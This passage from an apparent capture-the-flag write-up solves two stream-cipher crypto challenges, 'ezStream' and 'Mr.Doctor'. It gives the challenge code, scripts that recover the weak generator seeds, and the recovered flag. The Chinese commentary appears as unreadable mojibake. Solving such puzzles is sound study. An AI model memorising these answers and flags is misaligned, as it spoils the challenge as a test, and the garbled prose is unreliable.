class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>flag = f.read()<br>f.close()<br><span class="hljs-keyword">assert</span> flag[:<span class="hljs-number">8</span>] == <span class="hljs-string">&quot;Dest0g3&#123;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = getRandomNBitInteger(<span class="hljs-number">32</span>)<br>        self.b = getRandomNBitInteger(<span class="hljs-number">32</span>)<br>        self.m = getPrime(<span class="hljs-number">32</span>)<br>        self.seed = getRandomNBitInteger(<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.a * self.seed + self.b) % self.m<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.a, self.b, self.m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br><br><br>lcg = LCG()<br>lcg.output()<br>c = <span class="hljs-string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="hljs-built_in">ord</span>(flag[i]) ^ (lcg.<span class="hljs-built_in">next</span>() % <span class="hljs-number">10</span>))<br>              <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))])<br><span class="hljs-built_in">print</span>(bytes_to_long(c))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = 3939333498</span><br><span class="hljs-string">b = 3662432446</span><br><span class="hljs-string">m = 2271373817</span><br><span class="hljs-string">state1 = 17362</span><br><span class="hljs-string">state2 = 20624</span><br><span class="hljs-string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>æµåŠ å¯†ï¼Œçœ‹æ ·å­è¦æ‰¾seedçš„åˆå€¼ã€‚è€Œä¸”ç»™äº†ä¸€éƒ¨åˆ†çš„æ˜æ–‡ï¼Œå¯ä»¥æ±‚å¯†é’¥æµã€‚</p><p>éšæœºæ•°æ˜¯ç”¨getRandomNBitInteger(32)ç”Ÿæˆçš„ã€‚é‚£ä¹ˆseedçš„èŒƒå›´å°±æ˜¯ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mn>32</mn><mo>âˆ’</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{32-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>~<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>ã€‚é€‰æ‹©çˆ†ç ´æ¥æ±‚è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = <span class="hljs-number">3939333498</span><br>        self.b = <span class="hljs-number">3662432446</span><br>        self.m = <span class="hljs-number">2271373817</span><br>        self.seed = getRandomNBitInteger(<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.a * self.seed + self.b) % self.m<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.a, self.b, self.m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br><br><br>flag = <span class="hljs-number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br>flag = libnum.n2s(flag)<br>lcg = LCG()<br><br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**(<span class="hljs-number">32</span>-<span class="hljs-number">1</span>), <span class="hljs-number">2</span>**<span class="hljs-number">32</span> -<span class="hljs-number">1</span>):<br>    lcg.seed = seed<br>    <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">17362</span>:<br>        <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">20624</span>:<br>            lcg.seed = seed<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;seed = &quot;</span>, seed)<br>            <span class="hljs-keyword">break</span><br><br>lcg.<span class="hljs-built_in">next</span>()<br>lcg.<span class="hljs-built_in">next</span>()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(flag[i]^(lcg.<span class="hljs-built_in">next</span>()%<span class="hljs-number">10</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]))<br><br><span class="hljs-comment"># seed =  2376358340</span><br><span class="hljs-comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ç¬¬ä¸€ä¸ªæˆåŠŸçš„æ¥ä½œä¸ºseedã€‚è·‘çš„è¯å¤§æ¦‚ä¸‰åˆ†é’Ÿè·‘åˆ°è¿™ã€‚è¿˜å¥½è¿™é¢˜ç¬¬ä¸€ä¸ªå°±æ˜¯æ­£ç¡®çš„è§£ã€‚å¦‚æœè§£åœ¨åé¢çš„è¯ï¼Œåˆå¾—é‡æ–°è·‘äº†ã€‚ä¸è¿‡æƒ³è¦éå†æ•´ä¸ª <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mn>32</mn><mo>âˆ’</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{32-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>~<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>ç©ºé—´è¿˜æ˜¯æŒºå›°éš¾çš„ã€‚</p><p>åœ¨åšMr.Doctorçš„æ—¶å€™å‘ç°æœ‰æ›´ç®€å•çš„è§£æ³•ã€‚</p><p>æˆ‘ä»¬å»éå†æŸå¤±çš„é‚£16ä½æ•°æ®å³å¯ã€‚è¿™ä¸ªæœç´¢ç©ºé—´å¯æ¯”ä¹‹å‰çš„å°çš„å¤šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br>flag = libnum.n2s(flag)<br>lcg = LCG()<br><br>likeSeed = []<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>):<br>    lcg.seed = (<span class="hljs-number">17362</span> &lt;&lt; <span class="hljs-number">16</span>) + seed<br>    <span class="hljs-keyword">if</span> lcg.<span class="hljs-built_in">next</span>() == <span class="hljs-number">20624</span>:<br>        likeSeed.append((<span class="hljs-number">17362</span> &lt;&lt; <span class="hljs-number">16</span>) + seed)<br>        <span class="hljs-built_in">print</span>(likeSeed[-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> likeSeed:<br>    lcg.seed = i<br>    lcg.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(flag[i]^(lcg.<span class="hljs-built_in">next</span>()%<span class="hljs-number">10</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]))<br>    <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1137839988</span><br><span class="hljs-string">1137855425</span><br><span class="hljs-string">1137870862</span><br><span class="hljs-string">Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span><br><span class="hljs-string">Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span><br><span class="hljs-string">Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span><br></code></pre></td></tr></table></figure><p>ç”±äºè·‘å‡ºæ¥çš„ç»“æœå¹¶ä¸æ­¢ä¸€ä¸ªæ‰€ä»¥éƒ½è¿›è¡Œè¿ç®—å³å¯ã€‚</p><h2 id="mrdoctor"><a class="markdownIt-Anchor" href="#mrdoctor"></a> Mr.Doctor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> string<br><br>table = string.ascii_letters + string.digits<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>]<br>seed = getRandomNBitInteger(<span class="hljs-number">40</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SHA256</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.proof = []<br>        self.sha = <span class="hljs-number">0</span><br>        self.sha_flag = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encryption</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">4</span>):<br>            self.proof.append(flag[<span class="hljs-number">4</span> * i:<span class="hljs-number">4</span> + <span class="hljs-number">4</span> * i])<br>            self.sha = sha256(self.proof[i]).hexdigest().encode()<br>            self.sha_flag.append(bytes_to_long(self.sha))<br>        <span class="hljs-keyword">return</span> self.sha_flag<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = getPrime(<span class="hljs-number">64</span>)<br>        self.Amiya = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.Rosmontis = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.Blaze = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.seed = seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br><br>sha = SHA256()<br>sha_flag = sha.encryption()<br>elite = RHODES_ELITE()<br>elite.output()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ash = &quot;</span>, elite.<span class="hljs-built_in">next</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;SliverAsh = &quot;</span>, elite.<span class="hljs-built_in">next</span>())<br>W = <span class="hljs-string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="hljs-number">3</span>) ^ (elite.<span class="hljs-built_in">next</span>() % <span class="hljs-number">100</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(sha_flag))])<br><span class="hljs-built_in">print</span>(bytes_to_long(W))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Amiya =  956366446278</span><br><span class="hljs-string">Rosmontis =  1061992537343</span><br><span class="hljs-string">Blaze =  636205571590</span><br><span class="hljs-string">Doctor =  18068433704538283397</span><br><span class="hljs-string">Ash =  1097363493609113</span><br><span class="hljs-string">SliverAsh =  2051431344160327</span><br><span class="hljs-string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>è¿™é¢˜ä»£ç å’ŒezStreamæŒºåƒçš„ã€‚ä¸»ä½“éƒ½æ˜¯ä¸€ä¸ªæµåŠ å¯†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¾—åˆ°ç¬¬äºŒè½®åŠ å¯†æ—¶çš„seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = <span class="hljs-number">18068433704538283397</span> <span class="hljs-comment"># getPrime(64)</span><br>        self.Amiya = <span class="hljs-number">956366446278</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Rosmontis = <span class="hljs-number">1061992537343</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Blaze = <span class="hljs-number">636205571590</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.seed = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 956366446278x^2 + 1061992537343x + 636205571590 = 4494800869822930172 mod 18068433704538283397</span><br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br><br>r = RHODES_ELITE()<br>likeSeed = []<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">13</span>):<br>    r.seed =  (<span class="hljs-number">1097363493609113</span> &lt;&lt; <span class="hljs-number">12</span>) + seed<br>    <span class="hljs-keyword">if</span> r.<span class="hljs-built_in">next</span>() == <span class="hljs-number">2051431344160327</span>:<br>        <span class="hljs-comment"># seed = (1097363493609113 &lt;&lt; 12) + seed</span><br>        likeSeed.append((<span class="hljs-number">1097363493609113</span> &lt;&lt; <span class="hljs-number">12</span>) + seed)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(likeSeed)<br><span class="hljs-comment"># [4494800869822930172]</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªæœ‰ä¸€ä¸ªè§£ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜è¦æ±‚è§£åˆå§‹çš„seedæ‰èƒ½è¿›è¡Œè§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>    self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>    <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•´ç¯ä¸Šçš„è¿ç®—ã€‚æ˜¯åœ¨Zmod(18068433704538283397)ä¸Šçš„ä¸€ä¸ªå¤šé¡¹å¼ã€‚</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>956366446278</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1061992537343</mn><mi>x</mi><mo>+</mo><mn>636205571590</mn><mo>=</mo><mn>4494800869822930172</mn><mtext>â€‰</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>â€‰</mtext><mn>18068433704538283397</mn></mrow><annotation encoding="application/x-tex">956366446278x^2 + 1061992537343x + 636205571590 = 4494800869822930172 \, mod \, 18068433704538283397</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">9</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">6</span><span class="mord">4</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord">2</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">5</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">9</span><span class="mord">4</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord">8</span><span class="mord">6</span><span class="mord">9</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">8</span><span class="mord">4</span><span class="mord">3</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">8</span><span class="mord">2</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">7</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>956366446278</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1061992537343</mn><mi>x</mi><mo>+</mo><mn>636205571590</mn><mo>âˆ’</mo><mn>4494800869822930172</mn><mtext>â€‰</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>â€‰</mtext><mn>18068433704538283397</mn></mrow><annotation encoding="application/x-tex">f(x)=956366446278x^2 + 1061992537343x + 636205571590 - 4494800869822930172  \, mod \, 18068433704538283397</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span 